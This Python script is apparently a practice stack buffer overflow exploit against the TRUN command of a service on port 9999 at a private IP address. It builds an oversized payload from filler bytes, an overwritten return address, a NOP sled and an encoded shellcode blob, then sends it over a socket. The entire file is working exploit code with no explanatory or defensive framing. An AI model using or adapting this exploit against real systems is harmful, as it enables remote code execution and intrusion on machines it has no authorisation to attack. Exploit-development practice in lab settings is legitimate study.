#!/usr/bin/python3
import socket

server = '192.168.78.137'
sport = 9999

prefix = b'A' * 2006
eip = b'\xaf\x11\x50\x62'
nopsled = b'\x90' * 16
exploit = b"\xba\x47\xa7\xaa\xcb\xd9\xe5\xd9\x74\x24\xf4\x5f"
buf = b""
buf += b"\x2b\xc9\xb1\x52\x31\x57\x12\x83\xef\xfc\x03\x10"
buf += b"\xa9\x48\x3e\x62\x5d\x0e\xc1\x9a\x9e\x6f\x4b\x7f"
buf += b"\xaf\xaf\x2f\xf4\x80\x1f\x3b\x58\x2d\xeb\x69\x48"
buf += b"\xa6\x99\xa5\x7f\x0f\x17\x90\x4e\x90\x04\xe0\xd1"
buf += b"\x12\x57\x35\x31\x2a\x98\x48\x30\x6b\xc5\xa1\x60"
buf += b"\x24\x81\x14\x94\x41\xdf\xa4\x1f\x19\xf1\xac\xfc"
buf += b"\xea\xf0\x9d\x53\x60\xab\x3d\x52\xa5\xc7\x77\x4c"
buf += b"\xaa\xe2\xce\xe7\x18\x98\xd0\x21\x51\x61\x7e\x0c"
buf += b"\x5d\x90\x7e\x49\x5a\x4b\xf5\xa3\x98\xf6\x0e\x70"
buf += b"\xe2\x2c\x9a\x62\x44\xa6\x3c\x4e\x74\x6b\xda\x05"
buf += b"\x7a\xc0\xa8\x41\x9f\xd7\x7d\xfa\x9b\x5c\x80\x2c"
buf += b"\x2a\x26\xa7\xe8\x76\xfc\xc6\xa9\xd2\x53\xf6\xa9"
buf += b"\xbc\x0c\x52\xa2\x51\x58\xef\xe9\x3d\xad\xc2\x11"
buf += b"\xbe\xb9\x55\x62\x8c\x66\xce\xec\xbc\xef\xc8\xeb"
buf += b"\xc3\xc5\xad\x63\x3a\xe6\xcd\xaa\xf9\xb2\x9d\xc4"
buf += b"\x28\xbb\x75\x14\xd4\x6e\xd9\x44\x7a\xc1\x9a\x34"
buf += b"\x3a\xb1\x72\x5e\xb5\xee\x63\x61\x1f\x87\x0e\x98"
buf += b"\xc8\x68\x66\xec\x8a\x01\x75\xf0\x90\xdb\xf0\x16"
buf += b"\xce\xcb\x54\x81\x67\x75\xfd\x59\x19\x7a\x2b\x24"
buf += b"\x19\xf0\xd8\xd9\xd4\xf1\x95\xc9\x81\xf1\xe3\xb3"
buf += b"\x04\x0d\xde\xdb\xcb\x9c\x85\x1b\x85\xbc\x11\x4c"
buf += b"\xc2\x73\x68\x18\xfe\x2a\xc2\x3e\x03\xaa\x2d\xfa"
buf += b"\xd8\x0f\xb3\x03\xac\x34\x97\x13\x68\xb4\x93\x47"
buf += b"\x24\xe3\x4d\x31\x82\x5d\x3c\xeb\x5c\x31\x96\x7b"
buf += b"\x18\x79\x29\xfd\x25\x54\xdf\xe1\x94\x01\xa6\x1e"
buf += b"\x18\xc6\x2e\x67\x44\x76\xd0\xb2\xcc\x96\x33\x16"
buf += b"\x39\x3f\xea\xf3\x80\x22\x0d\x2e\xc6\x5a\x8e\xda"
buf += b"\xb7\x98\x8e\xaf\xb2\xe5\x08\x5c\xcf\x76\xfd\x62"
buf += b"\x7c\x76\xd4"

padding = b'F' * (100000 - 2006 - 4 - 16 - len(exploit) - len(buf))
attack = prefix + eip + nopsled + exploit + buf + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, sport))
print(s.recv(1024))
print("Sending attack to TRUN. with length", len(attack))
s.send(b'TRUN .' + attack + b'\r\n')
print(s.recv(1024))
s.send(b'EXIT\r\n')
print(s.recv(1024))
s.close()

